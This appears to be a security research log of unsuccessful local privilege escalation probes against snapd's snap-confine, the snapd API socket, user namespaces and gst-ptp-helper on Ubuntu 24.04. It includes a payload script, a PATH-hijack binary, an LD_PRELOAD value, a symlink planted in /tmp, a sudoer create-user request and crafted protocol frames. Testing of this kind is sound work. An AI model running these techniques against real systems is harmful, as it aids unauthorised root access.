@@ -1,0 +1,535 @@
+
+===== target package and default install proof =====
++ id; getent passwd attacker; cat /etc/os-release | sed -n "1,8p"; uname -a
+uid=0(root) gid=0(root) groups=0(root)
+attacker:x:1001:1001::/home/attacker:/bin/bash
+PRETTY_NAME="Ubuntu 24.04.4 LTS"
+NAME="Ubuntu"
+VERSION_ID="24.04"
+VERSION="24.04.4 LTS (Noble Numbat)"
+VERSION_CODENAME=noble
+ID=ubuntu
+ID_LIKE=debian
+HOME_URL="https://www.ubuntu.com/"
+Linux 4f5b414436ae 6.10.14-linuxkit #1 SMP Sat May 17 08:28:57 UTC 2025 aarch64 aarch64 aarch64 GNU/Linux
+rc=0
++ dpkg-query -W -f='${binary:Package}\t${Version}\t${Architecture}\n' ubuntu-minimal ubuntu-standard ubuntu-server snapd libgstreamer1.0-0 iputils-ping mtr-tiny 2>&1
+iputils-ping	3:20240117-1ubuntu0.1	arm64
+libgstreamer1.0-0:arm64	1.24.2-1ubuntu0.1	arm64
+mtr-tiny	0.95-1.1ubuntu0.1	arm64
+snapd	2.74.1+ubuntu24.04.4	arm64
+ubuntu-minimal	1.539.2	arm64
+ubuntu-server	1.539.2	arm64
+ubuntu-standard	1.539.2	arm64
+rc=0
++ dpkg -V snapd libgstreamer1.0-0 iputils-ping mtr-tiny; echo dpkg_verify_rc=$?
+missing     /usr/share/doc/snapd/NEWS.md.gz
+missing     /usr/share/man/man8/snap-confine.8.gz
+missing     /usr/share/man/man8/snap-discard-ns.8.gz
+missing     /usr/share/man/man8/snap.8.gz
+missing     /usr/share/man/man8/snapd-env-generator.8.gz
+missing     /usr/share/man/man8/ping.8.gz
+missing     /usr/share/man/man8/ping4.8.gz
+missing     /usr/share/man/man8/ping6.8.gz
+missing     /usr/share/man/man8/mtr-packet.8.gz
+missing     /usr/share/man/man8/mtr.8.gz
+dpkg_verify_rc=0
+rc=0
++ dpkg -S /usr/lib/snapd/snap-confine /usr/bin/ping /usr/bin/mtr-packet /usr/lib/aarch64-linux-gnu/gstreamer1.0/gstreamer-1.0/gst-ptp-helper
+snapd: /usr/lib/snapd/snap-confine
+iputils-ping: /usr/bin/ping
+mtr-tiny: /usr/bin/mtr-packet
+libgstreamer1.0-0:arm64: /usr/lib/aarch64-linux-gnu/gstreamer1.0/gstreamer-1.0/gst-ptp-helper
+rc=0
++ stat -c "%n %F %A %a %U:%G %u:%g %s" /usr/lib/snapd/snap-confine /usr/bin/ping /usr/bin/mtr-packet /usr/lib/aarch64-linux-gnu/gstreamer1.0/gstreamer-1.0/gst-ptp-helper
+/usr/lib/snapd/snap-confine regular file -rwxr-xr-x 755 root:root 0:0 199752
+/usr/bin/ping regular file -rwxr-xr-x 755 root:root 0:0 146992
+/usr/bin/mtr-packet regular file -rwxr-xr-x 755 root:root 0:0 67672
+/usr/lib/aarch64-linux-gnu/gstreamer1.0/gstreamer-1.0/gst-ptp-helper regular file -rwxr-xr-x 755 root:root 0:0 526528
+rc=0
++ getcap -v /usr/lib/snapd/snap-confine /usr/bin/ping /usr/bin/mtr-packet /usr/lib/aarch64-linux-gnu/gstreamer1.0/gstreamer-1.0/gst-ptp-helper
+/usr/lib/snapd/snap-confine cap_chown,cap_dac_override,cap_dac_read_search,cap_fowner,cap_setgid,cap_setuid,cap_sys_chroot,cap_sys_ptrace,cap_sys_admin,cap_sys_resource=p
+/usr/bin/ping cap_net_raw=ep
+/usr/bin/mtr-packet cap_net_raw=ep
+/usr/lib/aarch64-linux-gnu/gstreamer1.0/gstreamer-1.0/gst-ptp-helper cap_net_bind_service,cap_net_admin,cap_sys_nice=ep
+rc=0
++ snap version 2>&1; snap list --all 2>&1 || true
+snap          2.74.1+ubuntu24.04.4
+snapd         2.74.1+ubuntu24.04.4
+series        16
+ubuntu        24.04
+kernel        6.10.14-linuxkit
+architecture  arm64
+No snaps are installed yet. Try 'snap install hello-world'.
+rc=0
+
+===== attacker baseline and namespace controls =====
++ runuser -u attacker -- id; grep -E "^(Uid|Gid|Groups|Cap(Inh|Prm|Eff|Bnd|Amb)|NoNewPrivs|Seccomp):" /proc/self/status
+uid=1001(attacker) gid=1001(attacker) groups=1001(attacker)
+Uid:	1001	1001	1001	1001
+Gid:	1001	1001	1001	1001
+Groups:	1001 
+CapInh:	0000000000000000
+CapPrm:	0000000000000000
+CapEff:	0000000000000000
+CapBnd:	000001ffffffffff
+CapAmb:	0000000000000000
+NoNewPrivs:	0
+Seccomp:	0
+rc=0
++ runuser -u attacker -- ip link set lo down 2>&1; echo ip_link_set_lo_rc=$?
+RTNETLINK answers: Operation not permitted
+ip_link_set_lo_rc=2
+rc=0
++ runuser -u attacker -- unshare -Ur true 2>&1; echo unshare_user_rc=$?; unshare -Urn sh -c "id; grep -E \"^(Cap(Inh|Prm|Eff|Bnd|Amb))\" /proc/self/status" 2>&1; echo unshare_user_net_rc=$?
+unshare_user_rc=0
+uid=0(root) gid=0(root) groups=0(root)
+CapInh:	0000000000000000
+CapPrm:	000001ffffffffff
+CapEff:	000001ffffffffff
+CapBnd:	000001ffffffffff
+CapAmb:	0000000000000000
+unshare_user_net_rc=0
+rc=0
++ aa-status 2>&1 || true; test -e /etc/apparmor.d/usr.lib.snapd.snap-confine.real && sed -n "1,220p" /etc/apparmor.d/usr.lib.snapd.snap-confine.real | grep -E "capability|cgroup|change_profile|SNAP_MOUNT_DIR|/var/lib|/tmp/snap.rootfs" || true
+apparmor not present.
+@{SNAP_MOUNT_DIR_LIST}="{,/var/lib/snapd}/snap"
+    #include "/var/lib/snapd/apparmor/snap-confine"
+    # SNAP_MOUNT_DIR probe logic
+    # cgroup: devices
+    capability sys_admin,
+    capability dac_read_search,
+    capability dac_override,
+    /sys/fs/cgroup/ r,
+    /sys/fs/cgroup/devices/ r,
+    /sys/fs/cgroup/devices/snap.*/ rw,
+    /sys/fs/cgroup/devices/snap.*/cgroup.procs w,
+    /sys/fs/cgroup/devices/snap.*/devices.{allow,deny} w,
+    # cgroup: freezer
+    # Allow creating per-snap cgroup freezers and adding snap command (task)
+    # in the cgroup to determine if it is occupied.
+    /sys/fs/cgroup/freezer/ r,
+    /sys/fs/cgroup/freezer/snap.*/ w,
+    /sys/fs/cgroup/freezer/snap.*/cgroup.procs rw,
+    /sys/fs/cgroup/ r,
+    /sys/fs/cgroup/** r,
+    # cgroup: reading own cgroup
+    @{PROC}/@{pid}/cgroup r,
+    # cgroup: manage bpf map for device cgroup
+    capability sys_resource,
+    capability setuid,
+    capability setgid,
+    change_profile unsafe /** -> [^u/]**,
+    change_profile unsafe /** -> u[^n]**,
+    change_profile unsafe /** -> un[^c]**,
+    change_profile unsafe /** -> unc[^o]**,
+    change_profile unsafe /** -> unco[^n]**,
+    change_profile unsafe /** -> uncon[^f]**,
+    change_profile unsafe /** -> unconf[^i]**,
+    change_profile unsafe /** -> unconfi[^n]**,
+    change_profile unsafe /** -> unconfin[^e]**,
+    change_profile unsafe /** -> unconfine[^d]**,
+    change_profile unsafe /** -> unconfined?**,
+    change_profile unsafe /** -> {u,un,unc,unco,uncon,unconf,unconfi,unconfin,unconfine},
+    # deny change_profile unsafe /** -> {unconfined,/**},
+    # change_profile unsafe /** -> **,
+    # Note 2: This rule is not needed because of rule '/var/lib/** rw', however we keep it because at
+    /tmp/snap.rootfs_** rw,
+    mount options=(remount ro) -> /tmp/snap.rootfs_*/,
+    mount options=(rw rbind) @{SNAP_MOUNT_DIR_LIST}/*/*/**/ -> /tmp/snap.rootfs_**/,
+    mount options=(rw bind) @{SNAP_MOUNT_DIR_LIST}/*/*/** -> /tmp/snap.rootfs_*/**,
+    mount options=(rw rslave) -> /tmp/snap.rootfs_**/,
+    mount options=(rw rbind) /*/ -> /tmp/snap.rootfs_**/,
+    mount options=(rw rbind) /var/lib/snapd/snap/ -> /var/lib/snapd/snap/,
+    mount options=(rw rshared) -> /var/lib/snapd/snap/,
+    /tmp/snap.rootfs_*/ rw,
+    mount fstype=tmpfs none -> /tmp/snap.rootfs_*/,
+    mount options=(rw bind) /tmp/snap.rootfs_*/ -> /tmp/snap.rootfs_*/,
+    mount options=(rw unbindable) -> /tmp/snap.rootfs_*/,
+    mount options=(rw rbind) @{SNAP_MOUNT_DIR_LIST}/*/*/ -> /tmp/snap.rootfs_*/,
+    mount options=(rw rbind) / -> /tmp/snap.rootfs_*/,
+    mount options=(rw rslave) -> /tmp/snap.rootfs_*/,
+    mount options=(rw rbind) /{,run/}media/ -> /tmp/snap.rootfs_*/{,run/}media/,
+    mount options=(rw rbind) /run/netns/ -> /tmp/snap.rootfs_*/run/netns/,
+    mount options=(rw rbind) /dev/ -> /tmp/snap.rootfs_*/dev/,
+    mount options=(rw rslave) -> /tmp/snap.rootfs_*/dev/,
+    mount options=(rw rbind) /etc/ -> /tmp/snap.rootfs_*/etc/,
+    mount options=(rw rslave) -> /tmp/snap.rootfs_*/etc/,
+    mount options=(rw rbind) /home/ -> /tmp/snap.rootfs_*/home/,
+    mount options=(rw rslave) -> /tmp/snap.rootfs_*/home/,
+    mount options=(rw rbind) /root/ -> /tmp/snap.rootfs_*/root/,
+    mount options=(rw rslave) -> /tmp/snap.rootfs_*/root/,
+rc=0
++ findmnt -R /sys/fs/cgroup /sys/fs/bpf /snap /var/lib/snapd 2>&1 || true; ls -ld /sys/fs/cgroup /sys/fs/bpf /snap /var/lib/snapd /var/lib/snapd/snaps /var/snap /run/snapd /run/snapd/lock /run/snapd/ns 2>&1
+drwxr-xr-x 4 root root   80 May 16 16:10 /run/snapd
+drwxr-xr-x 2 root root   60 May 16 17:56 /run/snapd/lock
+drwxr-xr-x 2 root root   40 May 16 16:10 /run/snapd/ns
+drwxr-xr-x 1 root root 4096 May 16 15:18 /snap
+dr-xr-xr-x 2 root root    0 May 16 15:18 /sys/fs/bpf
+dr-xr-xr-x 7 root root    0 May 16 17:52 /sys/fs/cgroup
+drwxr-xr-x 1 root root 4096 May 16 17:58 /var/lib/snapd
+drwxr-xr-x 3 root root 4096 May 16 10:22 /var/lib/snapd/snaps
+drwxr-xr-x 2 root root 4096 Apr  2 06:44 /var/snap
+rc=0
+
+===== snapd sockets, API authorization, and writable state =====
++ systemctl is-active snapd.socket snapd.service snapd.seeded.service 2>&1 || true; ls -l /run/snapd.socket /run/snapd-snap.socket 2>&1; ss -xlpn 2>/dev/null | grep -E "/run/snapd(-snap)?\\.socket" || true
+active
+active
+active
+srw-rw-rw- 1 root root 0 May 16 15:18 /run/snapd-snap.socket
+srw-rw-rw- 1 root root 0 May 16 15:18 /run/snapd.socket
+u_str LISTEN 0      4096                                 /run/snapd.socket 6657               * 0    users:(("snapd",pid=765716,fd=9),("systemd",pid=1,fd=79))                                     
+u_str LISTEN 0      4096                            /run/snapd-snap.socket 6658               * 0    users:(("snapd",pid=765716,fd=10),("systemd",pid=1,fd=80))                                    
+rc=0
++ runuser -u attacker -- curl -i --max-time 5 --unix-socket /run/snapd.socket http://localhost/v2/system-info 2>&1 | sed -n "1,18p"
+  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
+                                 Dload  Upload   Total   Spent    Left  Speed
+  0     0    0     0    0     0      0      0 --:--:-- --:--:-- --:--:--     0100  2479    0  2479    0     0   980k      0 --:--:-- --:--:-- --:--:-- 1210k
+HTTP/1.1 200 OK
+Content-Type: application/json
+Date: Sat, 16 May 2026 17:58:15 GMT
+Transfer-Encoding: chunked
+
+{"type":"sync","status-code":200,"status":"OK","result":{"architecture":"arm64","build-id":"13476c98a1eccfcc83435dda3ccbd6db1b4f65be","confinement":"partial","features":{"apparmor-prompting":{"supported":false,"unsupported-reason":"cannot check apparmor kernel features: open /sys/kernel/security/apparmor/features: no such file or directory","enabled":false},"check-disk-space-install":{"supported":true,"enabled":false},"check-disk-space-refresh":{"supported":true,"enabled":false},"check-disk-space-remove":{"supported":true,"enabled":false},"classic-preserves-xdg-runtime-dir":{"supported":true,"enabled":true},"clustering":{"supported":true,"enabled":false},"confdb":{"supported":true,"enabled":false},"confdb-control":{"supported":true,"enabled":false},"content-compatibility-label":{"supported":true,"enabled":false},"dbus-activation":{"supported":true,"enabled":true},"gate-auto-refresh-hook":{"supported":true,"enabled":false},"hidden-snap-folder":{"supported":true,"enabled":false},"hotplug":{"supported":true,"enabled":false},"layouts":{"supported":true,"enabled":true},"move-snap-home-dir":{"supported":true,"enabled":false},"parallel-instances":{"supported":true,"enabled":false},"per-user-mount-namespace":{"supported":true,"enabled":false},"quota-groups":{"supported":true,"enabled":false},"refresh-app-awareness":{"supported":true,"enabled":true},"refresh-app-awareness-ux":{"supported":true,"enabled":false},"user-daemons":{"supported":true,"enabled":false}},"kernel-version":"6.10.14-linuxkit","locations":{"snap-bin-dir":"/snap/bin","snap-mount-dir":"/snap"},"managed":false,"on-classic":true,"os-release":{"id":"ubuntu","version-id":"24.04"},"refresh":{"timer":"00:00~24:00/4","hold":"2026-05-16T17:18:00Z"},"sandbox-features":{"configfiles":["mediated-configfiles"],"confinement-options":["classic","devmode"],"dbus":["mediated-bus-access"],"kmod":["mediated-modprobe"],"ldconfig":["mediated-ldconfig"],"mount":["layouts","mount-namespace","per-snap-persistency","per-snap-profiles","per-snap-updates","per-snap-user-profiles","stale-base-invalidation"],"seccomp":["bpf-actlog","bpf-argument-filtering","kernel:allow","kernel:errno","kernel:kill_process","kernel:kill_thread","kernel:log","kernel:trace","kernel:trap","kernel:user_notif"],"symlinks":["mediated-symlinks"],"udev":["device-cgroup-v2","device-filtering","tagging"]},"series":"16","snapd-bin-from":"native-package","system-mode":"run","version":"2.74.1+ubuntu24.04.4","virtualization":"docker"}}rc=0
++ runuser -u attacker -- curl -i --max-time 5 --unix-socket /run/snapd.socket http://localhost/v2/snaps 2>&1 | sed -n "1,24p"
+  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
+                                 Dload  Upload   Total   Spent    Left  Speed
+  0     0    0     0    0     0      0      0 --:--:-- --:--:-- --:--:--     0100    79  100    79    0     0   171k      0 --:--:-- --:--:-- --:--:-- 79000
+HTTP/1.1 200 OK
+Content-Type: application/json
+Date: Sat, 16 May 2026 17:58:15 GMT
+Content-Length: 79
+
+{"type":"sync","status-code":200,"status":"OK","result":[],"sources":["local"]}rc=0
++ runuser -u attacker -- curl -i --max-time 5 --unix-socket /run/snapd.socket -H "Content-Type: application/json" -X POST --data "{\"action\":\"install\",\"snaps\":[\"hello-world\"]}" http://localhost/v2/snaps 2>&1 | sed -n "1,24p"
+  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
+                                 Dload  Upload   Total   Spent    Left  Speed
+  0     0    0     0    0     0      0      0 --:--:-- --:--:-- --:--:--     0100   163  100   119  100    44  44452  16436 --:--:-- --:--:-- --:--:-- 81500
+HTTP/1.1 401 Unauthorized
+Content-Type: application/json
+Date: Sat, 16 May 2026 17:58:15 GMT
+Content-Length: 119
+
+{"type":"error","status-code":401,"status":"Unauthorized","result":{"message":"access denied","kind":"login-required"}}rc=0
++ runuser -u attacker -- curl -i --max-time 5 --unix-socket /run/snapd.socket -H "Content-Type: application/json" -X POST --data "{\"email\":\"root@example.invalid\",\"sudoer\":true}" http://localhost/v2/create-user 2>&1 | sed -n "1,24p"
+  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
+                                 Dload  Upload   Total   Spent    Left  Speed
+  0     0    0     0    0     0      0      0 --:--:-- --:--:-- --:--:--     0100   162  100   116  100    46   297k   117k --:--:-- --:--:-- --:--:--  158k
+HTTP/1.1 403 Forbidden
+Content-Type: application/json
+Date: Sat, 16 May 2026 17:58:15 GMT
+Content-Length: 116
+
+{"type":"error","status-code":403,"status":"Forbidden","result":{"message":"access denied","kind":"login-required"}}rc=0
++ runuser -u attacker -- curl -i --max-time 5 --unix-socket /run/snapd-snap.socket http://localhost/v2/system-info 2>&1 | sed -n "1,24p"
+  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
+                                 Dload  Upload   Total   Spent    Left  Speed
+  0     0    0     0    0     0      0      0 --:--:-- --:--:-- --:--:--     0100   155  100   155    0     0   370k      0 --:--:-- --:--:-- --:--:--  151k
+HTTP/1.1 403 Forbidden
+Content-Type: application/json
+Date: Sat, 16 May 2026 17:58:15 GMT
+Content-Length: 155
+
+{"type":"error","status-code":403,"status":"Forbidden","result":{"message":"could not determine snap name for pid: not supported","kind":"login-required"}}rc=0
++ runuser -u attacker -- for d in /snap /var/lib/snapd /var/lib/snapd/snaps /var/lib/snapd/seed /var/snap /run/snapd /run/snapd/lock /run/snapd/ns /sys/fs/cgroup /sys/fs/bpf; do if [ -e "$d" ]; then stat -c "%A %U:%G %n" "$d"; test -w "$d"; echo "test_writable_rc:$d:$?"; touch "$d/capability_helpers_uid1001" 2>&1; echo "touch_rc:$d:$?"; rm -f "$d/capability_helpers_uid1001" 2>/dev/null || true; else echo "missing:$d"; fi; done
+drwxr-xr-x root:root /snap
+test_writable_rc:/snap:1
+touch: cannot touch '/snap/capability_helpers_uid1001': Permission denied
+touch_rc:/snap:1
+drwxr-xr-x root:root /var/lib/snapd
+test_writable_rc:/var/lib/snapd:1
+touch: cannot touch '/var/lib/snapd/capability_helpers_uid1001': Permission denied
+touch_rc:/var/lib/snapd:1
+drwxr-xr-x root:root /var/lib/snapd/snaps
+test_writable_rc:/var/lib/snapd/snaps:1
+touch: cannot touch '/var/lib/snapd/snaps/capability_helpers_uid1001': Permission denied
+touch_rc:/var/lib/snapd/snaps:1
+missing:/var/lib/snapd/seed
+drwxr-xr-x root:root /var/snap
+test_writable_rc:/var/snap:1
+touch: cannot touch '/var/snap/capability_helpers_uid1001': Permission denied
+touch_rc:/var/snap:1
+drwxr-xr-x root:root /run/snapd
+test_writable_rc:/run/snapd:1
+touch: cannot touch '/run/snapd/capability_helpers_uid1001': Permission denied
+touch_rc:/run/snapd:1
+drwxr-xr-x root:root /run/snapd/lock
+test_writable_rc:/run/snapd/lock:1
+touch: cannot touch '/run/snapd/lock/capability_helpers_uid1001': Permission denied
+touch_rc:/run/snapd/lock:1
+drwxr-xr-x root:root /run/snapd/ns
+test_writable_rc:/run/snapd/ns:1
+touch: cannot touch '/run/snapd/ns/capability_helpers_uid1001': Permission denied
+touch_rc:/run/snapd/ns:1
+dr-xr-xr-x root:root /sys/fs/cgroup
+test_writable_rc:/sys/fs/cgroup:1
+touch: cannot touch '/sys/fs/cgroup/capability_helpers_uid1001': Permission denied
+touch_rc:/sys/fs/cgroup:1
+dr-xr-xr-x root:root /sys/fs/bpf
+test_writable_rc:/sys/fs/bpf:1
+touch: cannot touch '/sys/fs/bpf/capability_helpers_uid1001': No such file or directory
+touch_rc:/sys/fs/bpf:1
+rc=0
+
+===== snap-confine direct file-capability boundary =====
++ runuser -u attacker -- mkdir -p '/tmp/capability-helpers-probe/bin' '/tmp/capability-helpers-probe/common' '/tmp/capability-helpers-probe/data' '/tmp/capability-helpers-probe/fake-mount/fakesnap/current' '/tmp/capability-helpers-probe/private-target' && cat > '/tmp/capability-helpers-probe/payload.sh' <<'EOF'
+#!/bin/sh
+{
+  echo PAYLOAD_RAN
+  id
+  grep -E '^(Uid|Gid|Cap(Inh|Prm|Eff|Bnd|Amb))' /proc/self/status
+  /bin/sh -p -c 'id' 2>&1
+} > '/tmp/capability-helpers-probe/payload.out'
+EOF
+chmod +x '/tmp/capability-helpers-probe/payload.sh'
+cat > '/tmp/capability-helpers-probe/bin/snap-update-ns' <<'EOF'
+#!/bin/sh
+echo FAKE_UPDATE_NS_RAN > '/tmp/capability-helpers-probe/fake-update-ns.out'
+exit 0
+EOF
+chmod +x '/tmp/capability-helpers-probe/bin/snap-update-ns'
+ln -s '/tmp/capability-helpers-probe/private-target' /tmp/snap-private-tmp 2>/dev/null || true
+mkdir -p /tmp/snap.rootfs_ATTACK 2>/dev/null || true
+rc=0
++ runuser -u attacker -- env -i PATH='/tmp/capability-helpers-probe/bin:/usr/bin:/bin' HOME=/home/attacker USER=attacker SNAPD_DEBUG=1 SNAP_NAME=fakesnap SNAP_INSTANCE_NAME=fakesnap SNAP_REVISION=1 SNAP_COOKIE=cookie SNAP_CONTEXT=ctx SNAP_USER_COMMON='/tmp/capability-helpers-probe/common' SNAP_USER_DATA='/tmp/capability-helpers-probe/data' SNAP_MOUNT_DIR='/tmp/capability-helpers-probe/fake-mount' LD_PRELOAD='/tmp/capability-helpers-probe/nope.so' /usr/lib/snapd/snap-confine snap.fakesnap.app '/tmp/capability-helpers-probe/payload.sh' 2>&1; echo snap_confine_rc=$?; for f in '/tmp/capability-helpers-probe/payload.out' '/tmp/capability-helpers-probe/fake-update-ns.out'; do echo marker:$f; test -e $f && cat $f || echo MISSING; done
+DEBUG: -- snap startup {"stage":"snap-confine enter", "time":"1778954295.226561"}
+DEBUG: caps at startup: cap_chown,cap_dac_override,cap_dac_read_search,cap_fowner,cap_setgid,cap_setuid,cap_sys_chroot,cap_sys_ptrace,cap_sys_admin,cap_sys_resource=p
+DEBUG: ruid: 1001, euid: 1001, suid: 1001
+DEBUG: rgid: 1001, egid: 1001, sgid: 1001
+DEBUG: apparmor extensions to the system are not available
+DEBUG: initial caps: cap_chown,cap_dac_override,cap_dac_read_search,cap_fowner,cap_setgid,cap_setuid,cap_sys_chroot,cap_sys_ptrace,cap_sys_admin,cap_sys_resource=p
+DEBUG: after setting privileged caps: cap_chown,cap_dac_override,cap_sys_admin=eip cap_dac_read_search,cap_fowner,cap_sys_chroot,cap_sys_ptrace,cap_sys_resource+ep
+DEBUG: snap-confine found at /proc/1/root/usr/lib/snapd/snap-confine
+DEBUG: host snap-confine is owned by root
+DEBUG: SNAP_MOUNT_DIR (probed): /snap
+DEBUG: security tag: snap.fakesnap.app
+DEBUG: executable:   /tmp/capability-helpers-probe/payload.sh
+DEBUG: confinement:  non-classic
+DEBUG: base snap:    core
+DEBUG: umask reset, old umask was  022
+DEBUG: -- snap startup {"stage":"snap-confine mount namespace start", "time":"1778954295.226742"}
+DEBUG: creating lock directory /run/snapd/lock (if missing)
+DEBUG: opening lock directory /run/snapd/lock
+DEBUG: opening lock file: /run/snapd/lock/.lock
+DEBUG: sanity timeout initialized and set for 30 seconds
+DEBUG: acquiring exclusive lock (scope (global), uid 0)
+DEBUG: sanity timeout reset and disabled
+DEBUG: ensuring that snap mount directory is shared
+DEBUG: unsharing snap namespace directory
+DEBUG: releasing lock 5
+DEBUG: opened snap-update-ns executable as file descriptor 5
+DEBUG: opened snap-discard-ns executable as file descriptor 6
+DEBUG: creating lock directory /run/snapd/lock (if missing)
+DEBUG: opening lock directory /run/snapd/lock
+DEBUG: opening lock file: /run/snapd/lock/fakesnap.lock
+DEBUG: sanity timeout initialized and set for 30 seconds
+DEBUG: acquiring exclusive lock (scope fakesnap, uid 0)
+DEBUG: sanity timeout reset and disabled
+DEBUG: initializing mount namespace: fakesnap
+cannot locate base snap core: No such file or directory
+snap_confine_rc=1
+marker:/tmp/capability-helpers-probe/payload.out
+MISSING
+marker:/tmp/capability-helpers-probe/fake-update-ns.out
+MISSING
+rc=0
++ runuser -u attacker -- for tag in "snap..app" "snap.fakesnap/../../tmp.x" "snap.foo..bar.app"; do echo tag=$tag; env -i PATH=/usr/bin:/bin SNAP_NAME=fakesnap SNAP_INSTANCE_NAME=fakesnap SNAP_REVISION=1 SNAP_COOKIE=cookie /usr/lib/snapd/snap-confine "$tag" /bin/id 2>&1; echo rc=$?; done
+tag=snap..app
+security tag snap..app not allowed
+rc=1
+tag=snap.fakesnap/../../tmp.x
+security tag snap.fakesnap/../../tmp.x not allowed
+rc=1
+tag=snap.foo..bar.app
+security tag snap.foo..bar.app not allowed
+rc=1
+rc=0
++ runuser -u attacker -- unshare -Urnm bash -lc 'id; grep -E "^(Cap(Inh|Prm|Eff|Bnd|Amb))" /proc/self/status; mkdir -p /tmp/capability-helpers-probe/userns-snap/core/1; mount --bind /tmp/capability-helpers-probe/userns-snap /snap 2>&1; echo bind_snap_rc=$?; env -i PATH=/usr/bin:/bin SNAPD_DEBUG=1 SNAP_NAME=fakesnap2 SNAP_INSTANCE_NAME=fakesnap2 SNAP_REVISION=1 SNAP_COOKIE=cookie /usr/lib/snapd/snap-confine snap.fakesnap2.app /bin/id 2>&1; echo sc_userns_rc=$?; echo userns-root-created > /tmp/capability-helpers-probe/userns-created; stat -c "%n %u:%g %U:%G" /tmp/capability-helpers-probe/userns-created' 2>&1
+uid=0(root) gid=0(root) groups=0(root)
+CapInh:	0000000000000000
+CapPrm:	000001ffffffffff
+CapEff:	000001ffffffffff
+CapBnd:	000001ffffffffff
+CapAmb:	0000000000000000
+bind_snap_rc=0
+DEBUG: -- snap startup {"stage":"snap-confine enter", "time":"1778954295.241946"}
+DEBUG: caps at startup: =ep
+DEBUG: ruid: 0, euid: 0, suid: 0
+DEBUG: rgid: 0, egid: 0, sgid: 0
+DEBUG: apparmor extensions to the system are not available
+DEBUG: initial caps: =ep
+DEBUG: after setting privileged caps: =ep cap_chown,cap_dac_override,cap_sys_admin+i cap_setgid,cap_setuid-ep
+DEBUG: the user is member of root group
+cannot fstatat canonical snap directory: Permission denied
+sc_userns_rc=1
+/tmp/capability-helpers-probe/userns-created 0:0 root:root
+rc=0
++ ls -l /run/snapd/lock 2>&1 || true; find /tmp -maxdepth 1 \( -name "snap.rootfs_*" -o -name "snap-private-tmp" \) -printf "%M %u:%g %p -> %l\n" 2>/dev/null || true
+total 0
+-rw------- 1 root root 0 May 16 17:58 fakesnap.lock
+drwx------ root:root /tmp/snap-private-tmp -> 
+drwxr-xr-x attacker:attacker /tmp/snap.rootfs_ATTACK -> 
+rc=0
+
+===== gst-ptp-helper protocol and capability drop =====
++ runuser -u attacker -- python3 - <<'PY'
+import os, select, struct, subprocess, time
+helper = "/usr/lib/aarch64-linux-gnu/gstreamer1.0/gstreamer-1.0/gst-ptp-helper"
+cmd = [helper, "-i", "eth0", "--clock-id", "0x0102030405060708"]
+p = subprocess.Popen(cmd, stdin=subprocess.PIPE, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
+clock = p.stdout.read(11)
+print("pid", p.pid)
+print("clock_frame_len", len(clock), "hex", clock.hex())
+time.sleep(0.2)
+with open(f"/proc/{p.pid}/status", "r", encoding="utf-8") as f:
+    for line in f:
+        if line.startswith(("Uid:", "Gid:", "CapInh:", "CapPrm:", "CapEff:", "CapBnd:", "CapAmb:", "NoNewPrivs:")):
+            print(line.strip())
+subprocess.run(["getpcaps", str(p.pid)], check=False)
+ptp = bytearray(44)
+ptp[0] = 0x01
+ptp[1] = 0x02
+ptp[2:4] = (44).to_bytes(2, "big")
+ptp[20:28] = bytes.fromhex("0102030405060708")
+ptp[28:30] = (1).to_bytes(2, "big")
+ptp[30:32] = (0x1234).to_bytes(2, "big")
+ptp[32] = 1
+body = bytes([0]) + (0).to_bytes(8, "big") + ptp
+frame = struct.pack(">HB", len(body), 0) + body
+p.stdin.write(frame)
+p.stdin.flush()
+ready, _, _ = select.select([p.stdout], [], [], 2)
+ack = os.read(p.stdout.fileno(), 64) if ready else b""
+print("ack_len", len(ack), "ack_hex", ack.hex())
+p.stdin.close()
+try:
+    p.wait(timeout=2)
+except subprocess.TimeoutExpired:
+    p.kill()
+    p.wait()
+err = p.stderr.read().decode("utf-8", "replace").replace("\0", "?")
+print("rc", p.returncode)
+print("stderr_tail", err[-300:].replace("\n", "\\n"))
+PY
+765890: =
+pid 765890
+clock_frame_len 11 hex 0008020102030405060708
+Uid:	1001	1001	1001	1001
+Gid:	1001	1001	1001	1001
+CapInh:	0000000000000000
+CapPrm:	0000000000000000
+CapEff:	0000000000000000
+CapBnd:	000001ffffffffff
+CapAmb:	0000000000000000
+NoNewPrivs:	0
+ack_len 15 ack_hex 000c03000008b592a74c7301001234
+rc 0
+stderr_tail main.rs?gst_ptp_helper???~Binding to interface eth0?]?../libs/gst/helpers/ptp/main.rs?gst_ptp_helper???ï¿½Using clock ID [1, 2, 3, 4, 5, 6, 7, 8]?ï¿½?../libs/gst/helpers/ptp/main.rs?gst_ptp_helper??ï¿½Exited with error: Failed polling\n\nCaused by:\n\n  Hang up during polling on stdin for interface 1\n
+rc=0
++ runuser -u attacker -- python3 - <<'PY'
+import struct, subprocess
+helper = "/usr/lib/aarch64-linux-gnu/gstreamer1.0/gstreamer-1.0/gst-ptp-helper"
+p = subprocess.Popen([helper, "-i", "eth0", "--clock-id", "0x0102030405060708"], stdin=subprocess.PIPE, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
+print("clock", p.stdout.read(11).hex())
+ptp = bytearray(44)
+ptp[0] = 0x01
+ptp[1] = 0x02
+ptp[2:4] = (44).to_bytes(2, "big")
+ptp[20:28] = bytes.fromhex("9999999999999999")
+ptp[28:30] = (1).to_bytes(2, "big")
+ptp[30:32] = (0x2222).to_bytes(2, "big")
+ptp[32] = 1
+body = bytes([0]) + (0).to_bytes(8, "big") + ptp
+out, err = p.communicate(input=struct.pack(">HB", len(body), 0) + body, timeout=3)
+print("rc", p.returncode)
+print("extra_stdout", out.hex())
+print("stderr", err.decode("utf-8", "replace").replace("\0", "?")[-300:].replace("\n", "\\n"))
+PY
+clock 0008020102030405060708
+rc 0
+extra_stdout 
+stderr main.rs?gst_ptp_helper???~Binding to interface eth0?]?../libs/gst/helpers/ptp/main.rs?gst_ptp_helper???ï¿½Using clock ID [1, 2, 3, 4, 5, 6, 7, 8]?ï¿½?../libs/gst/helpers/ptp/main.rs?gst_ptp_helper??ï¿½Exited with error: Failed polling\n\nCaused by:\n\n  Hang up during polling on stdin for interface 1\n
+rc=0
